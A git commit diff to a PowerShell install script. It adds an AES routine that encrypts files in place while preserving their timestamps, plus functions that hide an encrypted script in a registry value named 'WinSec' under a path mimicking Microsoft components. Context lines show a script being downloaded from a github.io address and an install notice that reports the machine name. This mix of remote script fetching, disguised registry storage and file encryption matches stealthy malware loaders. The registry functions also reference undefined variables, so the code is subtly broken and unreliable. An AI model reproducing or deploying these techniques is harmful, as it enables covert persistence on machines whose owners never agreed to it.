85e337d9d24b067e9a4b97d03f7a77c038edf137
Your Name <you@example.com>
2021-09-28 14:53:52 -0400

    late

--- cmd/install-test.ps1
+++ cmd/install-test.ps1
@@ -44,6 +44,106 @@ $bytes = $encoding.GetBytes($string + "0" * $pad)
 return $bytes
 }
 
+
+function Invoke-AESEncryption {
+    [CmdletBinding()]
+    [OutputType([string])]
+    Param
+    (
+        [Parameter(Mandatory = $true)]
+        [ValidateSet('Encrypt', 'Decrypt')]
+        [String]$Mode,
+
+        [Parameter(Mandatory = $true)]
+        [String]$Key,
+
+        [Parameter(Mandatory = $true, ParameterSetName = "CryptText")]
+        [String]$Text,
+
+        [Parameter(Mandatory = $true, ParameterSetName = "CryptFile")]
+        [String]$Path
+    )
+
+    Begin {
+        $shaManaged = New-Object System.Security.Cryptography.SHA256Managed
+        $aesManaged = New-Object System.Security.Cryptography.AesManaged
+        $aesManaged.Mode = [System.Security.Cryptography.CipherMode]::CBC
+        $aesManaged.Padding = [System.Security.Cryptography.PaddingMode]::Zeros
+        $aesManaged.BlockSize = 128
+        $aesManaged.KeySize = 256
+    }
+
+    Process {
+        $aesManaged.Key = $shaManaged.ComputeHash([System.Text.Encoding]::UTF8.GetBytes($Key))
+
+        switch ($Mode) {
+            'Encrypt' {
+                if ($Text) {$plainBytes = [System.Text.Encoding]::UTF8.GetBytes($Text)}
+                
+                if ($Path) {
+                    $File = Get-Item -Path $Path -ErrorAction SilentlyContinue
+                    if (!$File.FullName) {
+                        Write-Error -Message "File not found!"
+                        break
+                    }
+                    $plainBytes = [System.IO.File]::ReadAllBytes($File.FullName)
+                    $outPath = $File.FullName + ".aes"
+                }
+
+                $encryptor = $aesManaged.CreateEncryptor()
+                $encryptedBytes = $encryptor.TransformFinalBlock($plainBytes, 0, $plainBytes.Length)
+                $encryptedBytes = $aesManaged.IV + $encryptedBytes
+                $aesManaged.Dispose()
+
+                if ($Text) {return [System.Convert]::ToBase64String($encryptedBytes)}
+                
+                if ($Path) {
+                    $B64Cipher=[System.Convert]::ToBase64String($encryptedBytes)
+                    Set-Content -Path $outPath -Value $B64Cipher
+                    #[System.IO.File]::WriteAllBytes($outPath, $encryptedBytes)
+                    (Get-Item $outPath).LastWriteTime = $File.LastWriteTime
+                    return "File encrypted to $outPath"
+                }
+            }
+
+            'Decrypt' {
+                if ($Text) {$cipherBytes = [System.Convert]::FromBase64String($Text)}
+                
+                if ($Path) {
+                    $File = Get-Item -Path $Path -ErrorAction SilentlyContinue
+                    if (!$File.FullName) {
+                        Write-Error -Message "File not found!"
+                        break
+                    }
+                    #$cipherBytes = [System.IO.File]::ReadAllBytes($File.FullName)
+                    $B64Cipher = Get-Content $File.FullName
+                    $cipherBytes=[System.Convert]::FromBase64String($B64Cipher)
+                    $outPath = $File.FullName -replace ".aes"
+                }
+
+                $aesManaged.IV = $cipherBytes[0..15]
+                $decryptor = $aesManaged.CreateDecryptor()
+                $decryptedBytes = $decryptor.TransformFinalBlock($cipherBytes, 16, $cipherBytes.Length - 16)
+                $aesManaged.Dispose()
+
+                if ($Text) {return [System.Text.Encoding]::UTF8.GetString($decryptedBytes).Trim([char]0)}
+                
+                if ($Path) {
+                    [System.IO.File]::WriteAllBytes($outPath, $decryptedBytes)
+                    (Get-Item $outPath).LastWriteTime = $File.LastWriteTime
+                    #return "File decrypted to $outPath"
+                }
+            }
+        }
+    }
+
+    End {
+        $shaManaged.Dispose()
+        $aesManaged.Dispose()
+    }
+}
+
+
 Function Decrypt-String($EncryptedString,$Passphrase)
 {
     $EncryptionKey=Set-Key $Passphrase
@@ -268,6 +368,7 @@ if($InstallFromLocal)
       $ScriptUrl='https://vr972be716a04eb6.github.io/schdtask/rpt.dat'
       $webclient = New-Object Net.WebClient
       $ClearScript = $webclient.DownloadString($ScriptUrl)
+
       $Bytes = [System.Text.Encoding]::Unicode.GetBytes($ClearScript) 
       $Base64 = [Convert]::ToBase64String($Bytes) 
       OutString "EncodedScript(downloaded): $EncodedScript"
@@ -276,3 +377,41 @@ if($InstallFromLocal)
 
 Send-InstallNotification "Schd Task Install Notice for $env:COMPUTERNAME" "test again, check file" $LogFilePath
 Cleanup
+
+
+function Save-EncryptedScript {
+    param (
+        [Parameter(Mandatory)]
+        [ValidateNotNullOrEmpty()]
+        [string]$ScriptData
+    )
+    $RegKeyPath="HKLM:\SOFTWARE\Microsoft\Software\Microsoft\Shared Tools"
+    $RegKeyPath="HKCU:\SOFTWARE\cybercastor\Software\Microsoft\Shared Tools"
+    $RegKeyName="WinSec"
+    $FullRegKeyPath=Join-Path $TestRegKeyPath $TestRegKeyName
+
+    $null=Remove-Item -Path $FullRegKeyPath -Recurse -Force -ErrorAction Ignore
+
+
+    $null=New-Item –Path $RegKeyPath –Name $RegKeyName -Force -ErrorAction Ignore
+    $null=New-Itemproperty -path $FullRegKeyPath -Name $RegKeyName -value $ScriptData -Force -ErrorAction Ignore
+}
+
+
+function Get-EncryptedScript {
+    param (
+        [Parameter(Mandatory)]
+        [ValidateNotNullOrEmpty()]
+        [string]$ScriptData
+    )
+    $RegKeyPath="HKLM:\SOFTWARE\Microsoft\Software\Microsoft\Shared Tools"
+    $RegKeyPath="HKCU:\SOFTWARE\cybercastor\Software\Microsoft\Shared Tools"
+    $RegKeyName="WinSec"
+    $FullRegKeyPath=Join-Path $TestRegKeyPath $TestRegKeyName
+
+    $Data=(Get-ItemProperty -Path $FullRegKeyPath -Name $RegKeyName).$RegKeyName
+    return $Data
+}
+
+
+
